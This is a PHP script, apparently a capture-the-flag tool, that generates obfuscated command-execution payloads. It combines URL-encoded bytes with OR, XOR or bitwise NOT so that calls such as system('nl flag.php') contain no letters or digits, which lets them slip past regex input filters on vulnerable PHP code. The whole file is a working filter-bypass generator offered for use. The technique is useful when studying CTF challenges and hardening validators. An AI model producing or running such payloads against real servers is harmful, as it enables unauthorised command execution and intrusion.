<?php
/*
# -*- coding: utf-8 -*-
# @Author: Y4tacker
# @Date:   2020-11-21 20:31:22
*/
//或

function orRce($par1, $par2){
    $result = (urldecode($par1)|urldecode($par2));
    return $result;
}

//异或
function xorRce($par1, $par2){
    $result = (urldecode($par1)^urldecode($par2));
    return $result;
}

//取反
function negateRce(){
    fwrite(STDOUT,'[+]your function: ');

    $system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));

    fwrite(STDOUT,'[+]your command: ');

    $command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));

    echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
}

//mode=1代表或，2代表异或，3代表取反
//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式
function generate($func,$cmd,$mode, $preg='/[0-9]/i'){
    $temp = [];
    if ($mode!=3){
        for ($i=0;$i<256;$i++){
            for ($j=0;$j<256;$j++){
                if ($i<16){
                    $hex_i = '0'.dechex($i);
                }else{
                    $hex_i = dechex($i);
                }
                if ($j<16){
                    $hex_j = '0'.dechex($j);
                }else{
                    $hex_j = dechex($j);
                }
                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
                }else{
                    $par1 = "%".$hex_i;
                    $par2 = '%'.$hex_j;
                    $res = '';
                    if ($mode==1){
                        $res = orRce($par1, $par2);
                    }else if ($mode==2){
                        $res = xorRce($par1, $par2);
                    }

                    if (ord($res)>=32&ord($res)<=126){
                        if ((strtoupper($res)===$res)){

                        }else{
                            if ($temp[$res]==null){
                                $temp[$res] = "$par1|$par2";
                            }

                        }

                    }
                }
            }

        }
        $res = "(func^tion)(cmd^line);";
        $par1 = "";
        $par2 = "";
        $par3 = "";
        $par4 = "";
        for($i=0;$i<strlen($func);$i++){
            $expl = explode("|",$temp[$func[$i]]);
            $par1.=$expl[0];
            $par2.=$expl[1];
        }
        for($i=0;$i<strlen($cmd);$i++){
            $expl = explode("|",$temp[$cmd[$i]]);
            $par3.=$expl[0];
            $par4.=$expl[1];
        }
        $res = preg_replace("/func/","\"$par1\"",$res);
        $res = preg_replace("/tion/","\"$par2\"",$res);
        $res = preg_replace("/cmd/","\"$par3\"",$res);
        $res = preg_replace("/line/","\"$par4\"",$res);
        echo $res;
//        var_dump($temp);
    }else{
        negateRce();
    }

}

//generate("system","ls",2,"/[a-z0-9]/i");
generate("system","nl flag.php",2,"/[a-z0-9]/i");